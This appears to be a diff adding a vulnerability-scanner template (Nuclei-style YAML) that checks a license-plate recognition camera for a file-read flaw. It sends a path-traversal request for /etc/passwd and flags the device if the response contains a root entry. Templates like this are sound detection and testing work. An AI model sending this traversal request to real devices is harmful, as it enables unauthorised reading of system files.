@@ -1,0 +1,22 @@
+id: dt-chepai-dvd-fileread
+
+info: 
+  name: DT-高清车牌识别摄像机 - 文件读取漏洞
+  author: qwtd
+  severity: high
+  tags: DT-高清车牌识别摄像机
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+      - type: status
+        status:
+          - 200
